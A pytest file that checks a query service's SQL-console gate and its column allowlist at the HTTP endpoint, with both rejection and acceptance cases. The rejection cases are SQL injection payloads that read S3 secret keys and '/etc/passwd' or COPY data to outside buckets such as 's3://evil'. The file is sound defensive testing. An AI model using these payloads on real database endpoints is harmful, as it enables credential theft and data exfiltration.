"""Endpoint-level cover for the caller-supplied SQL identifiers.

Every SQL-building site in the query service uses a bound parameter, a
validated allowlist, or a server-derived constant. This file gives two of
those guards reject-AND-accept tests at the endpoint:

  - the `?columns=` allowlist (the SELECT-list injection
    on `/api/v1/robots/{id}/data/{type}`), and
  - `sqlguard`, the SQL-console gate.

`bucket` is covered by `test_bucket_validation.py`. The tests run at the
endpoint because a guard that exists but is not wired in is not a guard.
"""
import importlib
import sys

import pytest
from fastapi.testclient import TestClient


def _import_query_service_main():
    """See test_bucket_validation.py: main.py mounts StaticFiles over the
    SPA build output, which only exists inside the service's Docker image."""
    if "query_service.main" in sys.modules:
        return sys.modules["query_service.main"]

    import fastapi.staticfiles as fastapi_staticfiles

    class _StubStaticFiles:
        def __init__(self, *args, **kwargs):
            pass

    original = fastapi_staticfiles.StaticFiles
    fastapi_staticfiles.StaticFiles = _StubStaticFiles
    try:
        return importlib.import_module("query_service.main")
    finally:
        fastapi_staticfiles.StaticFiles = original


qsm = _import_query_service_main()
client = TestClient(qsm.app)


# --- the SQL console gate, wired in ---------------------------------------

CONSOLE_REJECTED = [
    # Reads a session secret; must be rejected.
    "SELECT current_setting('s3_secret_access_key')",
    "SELECT current_setting('s3_access_key_id')",
    # The relation allowlist.
    "SELECT * FROM read_parquet('s3://other-bucket/x.parquet')",
    "COPY (SELECT 1) TO 's3://robotics-data/pwned.parquet'",
    "SELECT * FROM duckdb_settings()",
    "SELECT * FROM '/etc/passwd'",
]


@pytest.mark.parametrize("sql", CONSOLE_REJECTED)
def test_console_rejects_before_execution(sql):
    """400 from the gate, not a 200 carrying an error string: rejection has
    to happen before the statement reaches a connection with S3 access."""
    resp = client.post("/api/v1/query/sql", json={"sql": sql})
    assert resp.status_code == 400, (
        f"{sql!r} was not rejected by the gate (got {resp.status_code}: "
        f"{resp.text[:300]})"
    )
    assert "sql rejected" in resp.json().get("detail", "")


def test_console_response_never_contains_the_credentials():
    """Whatever the outcome, the response body must not carry the S3
    credentials."""
    from query_service import settings

    secret = settings.S3_SECRET_ACCESS_KEY
    resp = client.post(
        "/api/v1/query/sql",
        json={"sql": "SELECT current_setting('s3_secret_access_key') AS s"},
    )
    body = resp.text
    assert resp.status_code == 400
    if secret:
        assert secret not in body


def test_console_still_accepts_a_legitimate_read():
    """The accept half. With no S3 configured the endpoint returns an error
    payload rather than rows, but it must get PAST the gate -- a 400 here
    would mean the guard rejects ordinary console SQL."""
    resp = client.post(
        "/api/v1/query/sql",
        json={"sql": "SELECT topic, count(*) FROM all_parquet GROUP BY topic"},
    )
    assert resp.status_code != 400, (
        f"the guard rejected a legitimate console query: {resp.text[:300]}"
    )


# --- the ?columns= allowlist ---------------------------------------------

@pytest.fixture
def local_lake(monkeypatch):
    """Run `/api/v1/robots/{id}/data/{type}` against a local DuckDB table.

    The endpoint refuses to run at all unless S3 is configured, and the
    `columns` allowlist is applied *after* the lake is materialised — so a
    test that skips the setup never reaches the code under test. Standing up
    an in-memory `t_raw` with the real column set exercises the identifier
    path end to end without touching S3.
    """
    import duckdb
    from query_service import planner, settings

    monkeypatch.setattr(settings, "S3_PARQUET_BUCKET", "test-bucket")
    monkeypatch.setattr(settings, "S3_ENDPOINT", "http://objectstore:9000")
    monkeypatch.setattr(settings, "S3_ACCESS_KEY_ID", "k")
    monkeypatch.setattr(settings, "S3_SECRET_ACCESS_KEY", "s")

    def _fake_open():
        con = duckdb.connect(database=":memory:")
        con.execute("SET TimeZone='UTC';")
        con.execute(
            "CREATE TABLE t_raw (ts TIMESTAMP, topic VARCHAR, "
            "x DOUBLE, y DOUBLE, z DOUBLE)"
        )
        con.execute(
            "INSERT INTO t_raw VALUES "
            "(TIMESTAMP '2023-11-14 22:13:20', 'imu/linear_accel', 1.0, 0.0, 9.8)"
        )
        return con

    monkeypatch.setattr(planner, "open_duckdb", _fake_open)
    # `t_raw` already exists; the planner would otherwise try to read S3.
    monkeypatch.setattr(planner, "create_t_raw", lambda *a, **k: [])
    return None


COLUMN_INJECTIONS = [
    "* FROM t--",
    'x" , (SELECT 1) AS "z',
    "x, (SELECT current_setting('s3_secret_access_key'))",
    "1; COPY (SELECT 1) TO 's3://evil/x.parquet'",
    "no_such_column",
]


@pytest.mark.parametrize("columns", COLUMN_INJECTIONS)
def test_columns_param_rejects_anything_not_a_known_column(columns, local_lake):
    """Identifiers cannot be bound as parameters, so the SELECT list is
    allowlisted against the columns the registry says these files have."""
    resp = client.get(
        "/api/v1/robots/robot1/data/imu",
        params={"columns": columns},
    )
    assert resp.status_code == 400, (
        f"columns={columns!r} was not rejected (got {resp.status_code}: "
        f"{resp.text[:300]})"
    )
    assert "unknown column" in resp.text


@pytest.mark.parametrize("columns", ["ts", "ts,x", "ts,topic,x,y,z"])
def test_columns_param_accepts_real_columns(columns, local_lake):
    """The accept half: over-tightening this would break the SPA's column
    picker, and a rejection-only test would pass on an endpoint that 400s
    unconditionally."""
    resp = client.get(
        "/api/v1/robots/robot1/data/imu",
        params={"columns": columns},
    )
    assert resp.status_code != 400, (
        f"columns={columns!r} is a legitimate column list but was rejected: "
        f"{resp.text[:300]}"
    )
